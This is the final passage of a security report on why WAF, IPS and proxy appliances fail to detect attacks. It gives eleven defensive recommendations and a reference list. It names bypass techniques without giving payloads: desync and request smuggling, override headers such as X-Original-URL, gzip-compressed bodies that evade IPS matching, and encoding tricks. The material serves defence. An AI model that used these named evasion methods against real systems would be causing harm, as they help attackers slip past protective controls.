- If query/header-based judgment differs from actual frame processing results → upgrade path parity insufficient

---

## **7. Conclusions**

Analysis results indicate that detection failures of security appliances stem not from simple rule deficiency but from the structural root cause of **interpretation discrepancies between WAF–proxy–cache–application frameworks**. As confirmed by 2025 latest research (WAFFLED 1,207 unique bypasses, PortSwigger HTTP/2 desync, CVE-2025-32094 Expect desync), the areas where signature-based detection alone cannot provide defense are expanding.

Future detection systems must be enhanced in the following **eleven directions**, sorted by operational priority.

1. **Protocol Boundary Control (Highest Priority)**: HRS/desync directly leads to authentication/ACL bypass. HTTP/2 end-to-end application, regular desync scanner (HTTP Request Smuggler) operation, and strict blocking of 0.CL/Expect header variations are essential.

2. **Semantic Reinterpretation Blocking**: Unconditionally strip externally-sourced override headers such as `X-Original-URL`, `X-HTTP-Method-Override`, `x-middleware-subrequest` at the edge, and re-evaluate security rules after routing decisions. Manage path normalization bypass as a single control group.

3. **Inspection Scope Assurance**: Set Body/Header/Cookie oversize handling to MATCH (block) or separate logging, and explicitly configure JSON partial parse fallback policies. Prioritize services using large upload APIs, multipart, and long JSON arrays. **Content-Encoding (gzip/deflate) decompression before inspection must be verified as active** — empirical testing confirmed that IPS performs only raw byte matching without decompressing compressed bodies, allowing attack payloads to pass through (Section 4-3 Finding 1).

4. **Inspection Mode Selection Control**: Conservatively block/quarantine abnormal Content-Type (removed, modified, multi-declared), and set default behavior to MATCH on parser failure. Normalize non-standard requests through RFC-compliant proxy (HTTP-Normalizer) before inspection. For requests with different parser branches like multipart, JSON, XML, parser branch selection failure itself should be logged as a detection event.

5. **Normalize-then-Inspect**: All input values must be normalized and decoded to the same level as the backend before inspection. Match signatures only after resolving all variations including URL Encoding, JSON Unicode Escape, Double Encoding, Overlong UTF-8, Unicode visual confusables (NFC/NFKC), and hex encoding.

6. **Enhanced TLS Visibility Operations**: SSL Mirror/decryption appliances must be managed as Tier-0 operational targets. Certificate lifecycle automation, fail-open/fail-closed policies, decryption coverage SLO, canary tests, and post-decryption body/header parity verification are required. The criterion should be "critical traffic is actually inspected" not "the appliance exists".

7. **Sensor Availability/Health Management**: IDS/IPS memory, packet drops, reassembly limits, and process restarts directly translate to detection gaps. Sensor health SLO, drop rate alerts, HA/failover, decryption failure rate monitoring, and flow log/endpoint telemetry reinforcement are required. Where possible, maintain criteria to distinguish `actual drop symptoms` from `front proxy 403` using a local comparison lab (e.g., Suricata inline drop).

8. **Redefining WAF Rule Roles**: WAF/IPS rules are effective for short-term mitigation before patching, but are not permanent countermeasures for structural issues like parser discrepancy, TLS blind spots, and edge-origin mismatches. As seen in public incident cases, internet-exposed critical assets should prioritize "patching/isolation/visibility assurance" over "adding rules". Simultaneously, operational practices that over-rely on response codes (e.g., `403 response = device blocking`) must be corrected.

9. **Canonicalization / Cache Key Consistency Verification**: Duplicate header/cookie/JSON key, `Host`/`:authority`/`Forwarded`, and inputs not reflected in cache keys should all be managed as a single control group. Security decisions become meaningless when edge and origin adopt different values.

10. **Positive Security Adoption**: For APIs where parser discrepancies repeatedly occur, applying Positive Security measures such as OpenAPI/Swagger-based schema validation, unknown field blocking, type mismatch blocking, and additionalProperties restrictions is more effective than adding rules.

11. **Conservative OOB / Extended Protocol Judgment**: Callback non-receipt must be interpreted alongside DNS sinkhole, proxy, and egress filtering. For protocols like HTTP/3, WebSocket, GraphQL, and gRPC, protocol-aware inspection must be separately verified when usage is indicated.

---

#### **References**

1. The ultimate Bug Bounty guide to HTTP request smuggling vulnerabilities \- YesWeHack, accessed March 10, 2026, [https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities](https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities)
2. HTTP/1.1 must die: the desync endgame | PortSwigger Research, accessed March 10, 2026, [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)
3. CVE-2025-3454: Grafana Auth Bypass Vulnerability \- SentinelOne, accessed March 10, 2026, [https://www.sentinelone.com/vulnerability-database/cve-2025-3454/](https://www.sentinelone.com/vulnerability-database/cve-2025-3454/)
4. Path Normalization Bypass in Traefik Router \+ Middleware Rules \- GitHub Advisory, accessed March 10, 2026, [https://github.com/traefik/traefik/security/advisories/GHSA-gm3x-23wp-hc2c](https://github.com/traefik/traefik/security/advisories/GHSA-gm3x-23wp-hc2c)
5. WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls \- arXiv, accessed March 10, 2026, [https://arxiv.org/html/2503.10846v3](https://arxiv.org/html/2503.10846v3)
6. Web Application Firewall (WAF) Bypass Techniques that Work in 2025 \- Medium, accessed March 10, 2026, [https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b](https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b)
7. NowSecure Uncovers Multiple Security and Privacy Flaws in DeepSeek iOS Mobile App, accessed March 10, 2026, [https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/](https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/)
8. CVE-2025-32094 (Akamai/Netlify Expect-based desync), accessed March 10, 2026
9. CVE-2025-7783 (ASP.NET HPP JSON/array expansion), accessed March 10, 2026
10. Oversize web request components in AWS WAF \- AWS Documentation, accessed March 10, 2026, [https://docs.aws.amazon.com/waf/latest/developerguide/waf-oversize-request-components.html](https://docs.aws.amazon.com/waf/latest/developerguide/waf-oversize-request-components.html)
11. JsonBody \- AWS WAFV2 API Reference, accessed March 10, 2026, [https://docs.aws.amazon.com/waf/latest/APIReference/API_JsonBody.html](https://docs.aws.amazon.com/waf/latest/APIReference/API_JsonBody.html)
12. Test HTTP Methods \- OWASP WSTG, accessed March 10, 2026, [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)
13. Google ESPv2 X-HTTP-Method-Override JWT bypass, accessed March 10, 2026
14. Web Cache Deception \- PortSwigger Web Security Academy, accessed March 10, 2026, [https://portswigger.net/web-security/web-cache-deception](https://portswigger.net/web-security/web-cache-deception)
15. Ryan Barnett & Angel Hacker, Unicode-based WAF Bypass (2025), accessed March 10, 2026
16. IDS/IPS detection rule list (internal reference)
